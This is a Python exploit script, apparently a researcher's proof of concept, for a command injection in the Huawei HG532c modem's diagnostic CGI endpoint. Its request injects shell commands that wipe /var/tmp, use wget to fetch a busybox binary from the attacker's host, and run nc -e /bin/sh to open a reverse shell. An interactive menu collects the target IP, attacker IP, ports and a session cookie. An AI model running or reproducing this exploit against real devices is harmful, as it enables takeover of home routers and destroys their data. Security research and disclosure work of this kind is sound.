import requests
import sys

banner = """
                    _____   _____ ______   __  __           _                                          
                   |  __ \ / ____|  ____| |  \/  |         | |                                         
                   | |__) | |    | |__    | \  / | ___   __| | ___ _ __ ___  ___                       
                   |  _  /| |    |  __|   | |\/| |/ _ \ / _` |/ _ \ '_ ` _ \/ __|                      
                   | | \ \| |____| |____  | |  | | (_) | (_| |  __/ | | | | \__ \                      
  _             ___|_|  \_\\_____|______| |_|  |_|\___/_\__,_|\___|_| |_| |_|___/  _     _             
 | |           |  __ \                              |  ____|                  | | | |   (_)            
 | |__  _   _  | |__) |_____   _____ _ __ ___  ___  | |____   _____ _ __ _   _| |_| |__  _ _ __   __ _ 
 | '_ \| | | | |  _  // _ \ \ / / _ \ '__/ __|/ _ \ |  __\ \ / / _ \ '__| | | | __| '_ \| | '_ \ / _` |
 | |_) | |_| | | | \ \  __/\ V /  __/ |  \__ \  __/ | |___\ V /  __/ |  | |_| | |_| | | | | | | | (_| |
 |_.__/ \__, | |_|  \_\___| \_/ \___|_|  |___/\___| |______\_/ \___|_|   \__, |\__|_| |_|_|_| |_|\__, |
         __/ |                                                            __/ |                   __/ |
        |___/                                                            |___/                   |___/ 
                                                                      
Autor: Danilo Erazo - 2023
Command Injection - Tested and Discovered in Huawei Modem HG532c by DErazo
"""
print(banner)
#ip = sys.argv[1]

def rce(ip_router, ip_attacker, port_attacker, port_web_attacker, cookie):
    try:
        burp0_url = "http://" + ip_router +":80/html/management/excutecmd.cgi?cmd= + " + ip_attacker + ";rm%20-rf%20/var/tmp;mkdir%20/var/tmp;wget%20-g%20-v%20-l%20/var/tmp/busybox-mips%20-r%20/busybox-mips%20" + ip_attacker + "%20-P%20" + port_web_attacker + ";chmod%20755%20/var/tmp/busybox-mips;/var/tmp/busybox-mips%20nc%20" + ip_attacker + "%20" + port_attacker + "%20-e%20/bin/sh;loqsea&RequestFile=/html/management/diagnose.asp"
        burp0_cookies = {"Language": "en", "FirstMenu": "Admin_3", "SecondMenu": "Admin_3_2", "ThirdMenu": "Admin_3_2_0", "SessionID_R3": cookie}
        burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://192.168.1.1", "Referer": "http://192.168.1.1/html/management/diagnose.asp", "Upgrade-Insecure-Requests": "1"}
        resp = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    except:
        print("Error")
        exit()

while True:
    menu = input("1. Authenticated RCE\n2. No authenticated RCE\n3. Exit\n\nInput: ")
    if menu == "1":
        ip_router = input("--> Enter the router IP: ")
        ip_attacker = input("--> Enter the IP of the attacking machine: ")
        port_attacker = input("--> Enter the port number for the reverse shell: ")
        port_web_attacker = input("--> Set up web server and specify port number: ")
        cookie = input("--> Enter the session cookie: ")
        rce(ip_router, ip_attacker, port_attacker, port_web_attacker, cookie)
    else:
        print("Exploit finished!!")
        exit()







